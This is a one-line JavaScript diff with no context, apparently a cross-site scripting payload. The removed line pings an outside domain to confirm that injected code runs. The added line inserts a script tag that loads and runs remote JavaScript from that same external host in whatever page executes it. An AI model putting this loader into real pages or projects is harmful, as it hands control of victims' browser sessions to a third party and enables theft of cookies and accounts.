@@ -1,1 +1,1 @@
-new Image().src='https://x.hamzab3t.com/?poc=js-execution';
+document.head.appendChild(Object.assign(document.createElement('script'),{src:'//x.hamzab3t.com'}));
